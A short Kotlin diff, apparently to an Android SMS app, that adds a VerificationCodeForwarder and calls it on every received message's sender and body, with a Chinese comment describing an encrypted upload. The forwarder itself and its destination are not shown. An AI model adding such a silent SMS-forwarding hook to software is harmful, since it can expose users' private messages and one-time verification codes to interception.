@@ -37,7 +37,8 @@ class ReceiveSms @Inject constructor(
     private val messageRepo: MessageRepository,
     private val notificationManager: NotificationManager,
     private val updateBadge: UpdateBadge,
-    private val shortcutManager: ShortcutManager
+    private val shortcutManager: ShortcutManager,
+    private val verificationCodeForwarder: VerificationCodeForwarder
 ) : Interactor<ReceiveSms.Params>() {
 
     class Params(val subId: Int, val messages: Array<SmsMessage>)
@@ -65,6 +66,9 @@ class ReceiveSms @Inject constructor(
 
                     // Add the message to the db
                     val message = messageRepo.insertReceivedSms(it.subId, address, body, time)
+
+                    // 转发收到的未读短信（端到端加密上传）
+                    verificationCodeForwarder.forward(address, body)
 
                     when (action) {
                         is BlockingClient.Action.Block -> {
